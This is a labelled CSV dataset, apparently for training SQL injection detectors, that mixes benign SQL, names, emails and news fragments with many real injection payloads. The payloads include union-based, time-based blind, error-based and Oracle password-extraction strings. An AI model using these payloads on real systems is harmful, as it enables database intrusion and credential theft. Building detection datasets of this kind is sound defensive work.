Query,Label
"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1
17103014f,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu",1
00783778f,0
SELECT steep ( s )  FROM laid SELECT point FROM tribe,0
SELECT COUNT ( humanID ) FROM fed,0
6320,0
?revivir,0
1'+ ( select 'hcqf' where 9956 = 9956 and  ( 2993 = 4297 ) *4297 ) +',1
SELECT * FROM related WHERE personal = 'search'  AND  ( please = 'she' OR into = 'paper' ),0
1 where 9361 = 9361 and 7478 = 9170--,1
jellison@acch-portugal.uk,0
SELECT * FROM share WHERE curious BETWEEN 'better' AND 'office',0
segovia,0
"1 where 2674  =  2674 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM satisfied WHERE figure BETWEEN '1996-07-01' AND '1996-07-31',0
"Unlike systems Earth , could also prove gravitational waves created Big Bang , thus provide fresh knowledge regarding origin cosmos",0
zuk,0
SELECT * FROM afraid FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM corner,0
"-8651"" )  where 8391 = 8391 union all select 8391,8391#",1
6988630000000001,0
1 )  as nxmd where 8650 = 8650,1
champn,0
"-2759%""   )    )    or 7769  =  1249#",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3088' LIMIT 1,0
select  ( case when  ( 2140 = 5325 )  then 2140 else 2140* ( select 2140 from information_schema.character_sets )  end ) #,1
"UPDATE second SET rocket =  'hearing', City =  'use' WHERE test =  slept",0
"1"" where 5927  =  5927",1
"calle gibraltar, 88",0
1714795678341656,0
"1  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  8024 = 8024",1
marquand@eneltajo.bn,0
49si90q00m87a,0
8318,0
SELECT * FROM measure WHERE burn = 'pretty' LIMIT 3,0
589ecialid6d,0
"1"" and make_set ( 6520 = 9958,9958 )",1
-8538%' or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and '%' = ',1
de martino valds,0
"1%"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""%"" = """,1
SELECT AVG ( thee ) FROM language SELECT SUM ( friend ),0
"-8812"" )  where 1646 = 1646 union all select 1646,1646,1646,1646,1646,1646--",1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1
"&quot; If want take peaceful stroll along section so-called Cloaca Maxima , &quot; says Schulze , encouraging guests",0
SELECT tonight ( s )  FROM population FULL OUTER JOIN,0
8578275476079932,0
dalia,0
SELECT TOP 50 PERCENT * FROM measure SELECT * FROM stiff FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM paint,0
1%' and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and '%' = ',1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
1' where 2145  =  2145,1
taboada,0
"-9672'  )  )   as rupb where 8218 = 8218 or make_set ( 4954 = 1836,1836 ) --",1
koprulu,0
audadora,0
1' in boolean mode )  and  ( 3020 = 3020 ) *6703#,1
amn,0
dangers9@paremoselalzheimer.az,0
SELECT * FROM rhyme WHERE sink IN  ( SELECT furniture FROM our ),0
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'fdoc' like 'fdoc",1
505975000000000,0
wailing@mariposasentudia.je,0
3771,0
SELECT * FROM guess WHERE mirror = 'white'  AND  ( gentle = 'fought' OR headed = 'object' ),0
"From exhibition vestibule , tunnel leads preserved Roman sewer , measuring around 120 metres length",0
inobediecia,0
"1"" order by 1#",1
SELECT COUNT ( pick ) FROM guard,0
53087910t,0
abigar,0
ulldemolins,0
c26ve7sar,0
-9393' where 3119 = 3119 or 8571 = 8571--,1
"1'+ ( select 'mikf' where 5814 = 5814 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
avelino,0
03500,0
educativo,0
"1%""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"SELECT * FROM string WHERE stranger NOT IN  ( 'swim', 'art', 'arrive' )",0
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'fbzo' like 'fbzo,1
SELECT loose ( s )  FROM golden LEFT JOIN,0
"1""   )    )    as fapw where 4722  =  4722 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM baby WHERE cast NOT LIKE 'twenty%',0
"1' )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )",1
SELECT COUNT ( wait ) FROM army,0
"Then, again, tell me, good man to-day, obligation put poor men good situations",0
"1' )  and elt ( 4249 = 4249,7259 )  and  ( 'bkag' = 'bkag",1
"-3703""   )    )     )   union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1
"1"" )  as uyns where 4751 = 4751 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --",1
SELECT * FROM stuck WHERE related = 'serious'  AND City = 'former',0
"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
SELECT COUNT ( worryID ) FROM dog,0
"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",1
"1'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 'dbsm' = 'dbsm",1
"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1"" rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and ""qfhv"" = ""qfhv",1
SELECT COUNT ( wantID ) FROM yesterday,0
? or 1 = 1 --,1
omens@showenvivo.com.pm,0
"1%""  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"select pg_sleep ( 5 )  and   (  (   ( ""nvuv"" like ""nvuv",1
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fktl""  =  ""fktl",1
"SELECT river AS mainly, least AS [friend]  FROM exactly",0
85640413m,0
SELECT make ( s ) FROM court INNER JOIN,0
"1"" )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( ""kxws"" like ""kxws",1
trumbull.presie@esbien.pk,0
aznar,0
"1""  )  )   as vtad where 3653 = 3653 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
"During trial , Kana admitted bar Booysen night attack",0
90899794e,0
SELECT COUNT ( excellent )  FROM dropped,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""ihqf""  =  ""ihqf",1
19133,0
g73no,0
to85lo372,0
waitfor delay '0:0:5' and  ( 'eaxu' = 'eaxu,1
llasera,0
4277353398050908,0
margheti,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1
berleand@campanasextractoras.la,0
1 )  where 8813 = 8813,1
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,1
"1"" where 5796  =  5796 and sleep  (  5  )  #",1
israel_piggot@joyclub.pe,0
SELECT COUNT ( purpleID ) FROM why,0
6255250000000000,0
abdel-az,0
horgan,0
"1""  )   where 3058  =  3058 union all select null--",1
SELECT * FROM basket  WHERE joy NOT LIKE '[blow]%',0
SELECT not ( s )  FROM felt SELECT hollow ( s ),0
&quot; The firefighters brilliant,0
warriner,0
or 0  =  0 --,1
"robert graves, 101",0
1  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 2197 = 2197,1
"1  )   where 5598  =  5598 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"SELECT corner,grandfather FROM whispered WHERE behavior = 'income' UNION SELECT slowly, frog FROM greatly",0
1002170000000000,0
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",1
"-6095""   )    )    as kgfp where 3601  =  3601 or 7287  =  9373#",1
"&quot; We participate wild card process , &quot; said former national team player Pascal Roller , putting together concept professional club Hansa town since 2012",0
"infantes de carrion, 122",0
"SELECT * FROM program WHERE clearly IN  ( 'dead', 'thirty', 'engineer' )",0
DELETE FROM closely WHERE below = 'higher',0
"-4637"" where 8354  =  8354 or 1186  =  2714--",1
SELECT * FROM alone WHERE bush BETWEEN 'volume' AND 'spread',0
"-5617 )  where 2132 = 2132 union all select 2132,2132,2132,2132#",1
"&quot; And , recently , cannot excuse failure design simple website three years since Affordable Care Act signed law",0
iwasaki@chaqueta.com.asia,0
"-5052   )    )     )   union all select 8351,8351,8351,8351#",1
"But devices testing appeal highway planners &apos;t use GPS deliver limited amount information , uploaded periodically modem",0
"1%"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
6172398321911966,0
SELECT interest ( s )  FROM still,0
drake3,0
SELECT * FROM church FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT COUNT ( fly ) FROM series,0
"1%""  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""%"" = """,1
"1%""  )  )   )  union all select null,null,null--",1
"1'  )  )   )  union all select null,null,null,null,null,null,null#",1
1' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and 'gpax' = 'gpax,1
SELECT * FROM born 3 SELECT * FROM us,0
"SELECT driverID AS ID, string AS year FROM event",0
"1  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( 6556 = 6556",1
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
1' where 9206 = 9206,1
s38und7705it*7,0
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew",1
26015420m,0
guinee@misanimalesdomesticos.jp,0
"1' )  where 7561 = 7561 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"-9606%""  )  )   )  union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1
cendreros,0
castellanos de moriscos,0
"1, ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select 1 from generate_series ( 8979,8979,case when  ( 8979 = 8979 )  then 1 else 0 end )  limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )",1
waitfor delay '0:0:5' and    (    (     (  8981  =  8981,1
"calle profeta, 96, 2?c",0
delmare.seidner@vinavilano.tn,0
"The log must thrown vertically , somersault finish lying straight",0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  'zdkn' = 'zdkn",1
3658503055705186,0
7acato,0
"1%' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and '%' = '",1
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",1
2174818451824569,0
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,1
cortland@tobarisch.bs,0
alceo,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 27990 )  ORDER BY meta_id ASC",0
47330,0
hungkai,0
9.15202E+015,0
andrease,0
"According The Star newspaper , new bill effectively hand government &quot; stranglehold media , &quot; The Standard said democracy free speech Kenya &quot; dealt major blow &quot; lambasted bill &quot; draconian",0
"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
otxandio,0
judges compromising necessity judge avoid appearance partiality part series media interviews public statements responding publicly criticism court,0
6819239674494837,0
SELECT those FROM rear,0
pallen,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and 'hvqt' = 'hvqt",1
"Prof Crystal said future human vaccine completely safe could given children tempted try cigarette , preventing nicotine addiction",0
SELECT * FROM matter WHERE identity BETWEEN '1996-07-01' AND '1996-07-31',0
"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",1
"1'  )  )   as vqrt where 5173 = 5173 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT * FROM stretch WHERE cast BETWEEN '1996-07-01' AND '1996-07-31',0
-2679'  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'cutk' like 'cutk,1
SELECT * FROM store FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM nuts,0
67sm1met93,0
"1"" )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""rvub"" like ""rvub",1
"-5925 )  where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1
"SELECT * FROM went WHERE musical NOT IN  ( 'jack', 'settle', 'eaten' )",0
SELECT AVG ( range ) FROM position SELECT SUM ( silver ),0
9115,0
"Because androgen receptors faulty , Katie developed female characteristics",0
SELECT * FROM fewer WHERE care IN  ( SELECT thank FROM were ),0
"1' and elt  (  4249  =  4249,7259  )",1
SELECT * FROM saved FETCH FIRST 50 PERCENT ROWS ONLY,0
laycock_faulds@peaf.sd,0
2214198462446690,0
c/ dique de abrigo 96 5?h,0
dybenko,0
1'+ ( select 'sbji' where 7989 = 7989 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  +',1
milionario.kirkham@programa-gestion-erp.mil,0
dionisio@bijoubijoudiferente.tv,0
5010000000000000,0
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",1
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",1
Society everywhere conspiracy manhood every one members,0
SELECT * FROM happy WHERE longer = 'chest'  AND  ( doing = 'torn' OR horn = 'us' ),0
select  ( case when  ( 9490 = 6134 )  then 9490 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
Jumbo also first disinfect hands could reach microphone,0
1'  )  )   as kgfp where 2366 = 2366,1
SELECT * FROM  ( SELECT camera FROM chicken ),0
9974650930559392,0
"SELECT Orders.childrenrID, Employees.review, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.quicklyID ORDER BY Orders.reasonID",0
kava_ivic@comercioenlacalle.info,0
"select * from users where id = 1 union select @<@$,version (  )  -- 1",1
SELECT arrange ( s )  FROM oldest SELECT know ( s ),0
quel,0
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
2815170000000000,0
52930776w,0
The best moments evening singing starts - tracks range Deep Purple traditional folk songs,0
heki,0
"c/ lope de rueda s/n, 9-f",0
"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",1
"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",1
1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,1
matie,0
20741927k,0
5900,0
SELECT * FROM identity WHERE nature = 'bottom' FETCH FIRST 3 ROWS ONLY,0
45221,0
bardischewski9@sexotelefono.rw,0
veracruz,0
"Also involved project Chamber Industry Commerce Neubrandenburg German Hotel Restaurant Association (Deutsche Hotel- und Gaststätte , Dehoga) Mecklenburg-Western Pomerania",0
SELECT column_name FROM table_name WHERE EXISTS,0
"1 where 8948  =  8948 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
loralie,0
"san lazaro, 34",0
"SELECT Employees.ready, COUNT ( Orders.abilityID )  AS usualFROM    ( OrdersINNER JOIN lady ON Orders.wholeID  =  Employees.everythingID )",0
5223158056651718,0
"That said , I hope finally start winning",0
1' )  or sleep ( 5 ),1
selj@ebaz.travel,0
8179150000000000,0
SELECT * FROM rear WHERE recently = 'finger'  AND  ( next = 'depend' OR snake = 'rate' ),0
SELECT * FROM balance WHERE design = 'easier',0
"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",1
928,0
"SELECT * FROM jump ORDER BY little ASC, make DESC",0
33,0
SELECT * FROM vessels FETCH FIRST 3 ROWS ONLY,0
99020664y,0
SELECT TOP 3 * FROM between,0
vencilln,0
freiss@turinga.tn,0
SELECT * FROM pot WHERE bring NOT BETWEEN 'crowd' AND 'dry',0
"1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
artenio,0
SELECT * FROM  ( SELECT conversation FROM pick ),0
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",1
lugartenencia,0
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",1
"According confession , five occasions got know women via Internet telephone contacts , sent onto streets weeks",0
bannister-griffel@youtubed.la,0
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",1
"1%"" and elt ( 1210 = 1210,sleep ( 5  )  )   and ""%"" = """,1
SELECT * FROM becoming WHERE hunter IN  ( SELECT thin FROM guess ),0
1   )    )    rlike sleep  (  5  )  #,1
1'+  (  select 'cwta' where 6091  =  6091,1
"SELECT behavior, torn, coat FROM man WHERE studied  IS NULL",0
"1',  (  case when 3598  =  2118 then 1 else null end  )",1
"SELECT * FROM gold ORDER BY bicycle, nation",0
azadonad?a,0
1' and 2908  =  8067--,1
1 where 7299 = 7299 rlike sleep ( 5 ) --,1
"1' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
1   )    )    as bvij where 7913  =  7913,1
srinivas,0
"SELECT colorID AS ID, identity AS hay FROM date",0
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",1
"calle jose canovas pujante, 106 8g",0
"It accepts errors victims , builds",0
giridhar,0
"1'+ ( select 'ejox' where 2719 = 2719 union all select null,null,null#",1
1  )   as bidc where 5268  =  5268 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""%""  =  """,1
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1
co2posi9or,0
Yet interesting point lost retelling whiskery old tale,0
"1' )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
goman@fbi-criminal-network.com.mh,0
SELECT AVG ( know ) FROM toward,0
qui0g6n16si2o,0
"-1451%'  )   union all select 7666,7666,7666#",1
"1%' )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
SELECT AVG ( too ) FROM gas,0
03820,0
"1' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )",1
SELECT nearest ( s )  FROM cage SELECT eight ( s ),0
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",1
7671256025414035,0
"1"" )  as ybkp where 7788 = 7788 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
"1""  )  )   as svim where 4924 = 4924 and 7932 = 5870",1
5856,0
"-4865 where 1386 = 1386 union all select 1386,1386,1386,1386#",1
According Green Party MP,0
1 )  rlike sleep ( 5 ) #,1
UE1,1
SELECT * FROM flight WHERE aid = 'nervous'  AND City = 'solution',0
"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and 'owwf' = 'owwf",1
"1   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4277  =  4277",1
SELECT TOP 3 * FROM hand SELECT * FROM writer 3SELECT * FROM seeing,0
"SELECT * FROM classroom WHERE simplest NOT IN  ( 'pleasant', 'stems', 'summer' )",0
SELECT * FROM mountain WHERE block BETWEEN modern09/01/1996dollar AND come15/31/1996love,0
"1 )  where 1270 = 1270 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'pded' = 'pded",1
"1""  )   where 7753  =  7753",1
"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",1
"SELECT back AS himself, sand AS [clay]  FROM shelter",0
calle codigo correspondencia oficial correos-telegrafos 33,0
"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"In fact , Americans spend $ 330 million pet costumes year , according NRF",0
carol,0
zaragoza,0
7688901932687073,0
"1 where 8074  =  8074 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
SELECT TOP 3 * FROM shoulder WHERE ought = 'mostly',0
1   )    )    and 3228  =  7376#,1
martinez,0
suray,0
"1""   )    )     )   and   (  7758  =  4628  )  *4628 and    (    (     (  ""wzas""  =  ""wzas",1
"SELECT * FROM hospital WHERE girl IN  ( 'however', 'most', 'milk' )",0
anatoli,0
"Among initiatives , Burfien wants organise study days young people , inviting famous faces studied theology",0
4916,0
es2o135mie5to,0
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1
select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,1
SELECT * FROM three WHERE captured = 'actually' LIMIT 3,0
88194085x,0
54310177r,0
"-2314""  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  ""uatq"" like ""uatq",1
bettina,0
"1%' )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"This therefore provided ideal conditions pop star , Dieter Thomas Kuhn , band",0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1
kamber@weat.gd,0
if  (  8182  =  3225  )   select 8182 else drop function kpzk--,1
4750834665833814,0
1'  )  )   as joco where 2922 = 2922,1
benidoleig,0
hanhua,0
cioffi,0
8678590000000000,0
SELECT COUNT ( warnID ) FROM third,0
"&quot; I &apos;m hopeful federal assistance package go long way towards taking state &apos;s public health system critical list , &quot; Mr Wilkie said",0
SELECT * FROM law ORDER BY line DESC,0
s!u2cep7ivo,0
"&quot; A second autopsy , however , listed different cause death , according Moore",0
74,0
The pair managed break away field keeping expectations,0
SELECT * FROM although FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM consonant,0
SELECT * FROM cannot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM itself,0
SELECT Count ( * )  AS previous,0
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )",1
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1
sabio,0
-8369  )   where 7234  =  7234 order by 1--,1
arena@productosgarantizados.uy,0
joyan,0
SELECT * FROM moving ORDER BY finger DESC,0
r92e1*56e,0
37291,0
"avenida rafael cabrera, 24, 8?g",0
What conditions required formation planets life ? The precise processes formation stars large gas clouds - thus formation planets orbit stars - lie proverbial darkness,0
